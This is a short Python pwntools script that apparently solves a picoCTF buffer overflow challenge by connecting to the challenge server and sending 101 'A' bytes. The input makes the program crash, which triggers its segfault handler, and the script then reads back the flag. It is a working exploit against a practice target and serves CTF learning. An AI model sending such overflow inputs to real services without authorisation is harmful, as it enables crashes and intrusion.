#!/usr/bin/env python3

from pwn import *

#exe = ELF("./vuln_patched")
#context.binary = exe

def main():
    p = remote('saturn.picoctf.net', 51110)

    # Really easy challenge, just need to call the sigsev_handler function
    #   this is done by seg faulting
    # Just enter a bunch of characters greater than 100 to overflow bugger and cause a segfault

    # Send payload
    overflow_input = b'A' * 101
    p.sendlineafter(b'Input:', overflow_input)

    # Retrieve flag
    flag = p.recvline_contains(b'picoCTF')
    log.info('Here is the flag={}'.format(flag))
    p.interactive()


if __name__ == "__main__":
    main()
